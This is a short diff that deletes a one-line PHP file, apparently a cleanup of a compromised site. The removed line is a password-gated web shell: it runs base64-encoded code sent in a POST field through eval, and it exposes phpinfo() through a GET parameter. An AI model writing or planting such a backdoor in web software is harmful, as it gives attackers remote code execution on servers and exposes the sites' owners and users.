@@ -1,1 +1,0 @@
-<?php $hash = '233b8273337bdb0090abe8eef3375b6c'; if(isset($_POST['ue'])){if (md5($_POST['hash']) === $hash) @eval(base64_decode($_POST['ue']));exit;}if(isset($_GET['sesion'])){phpinfo();} ?>
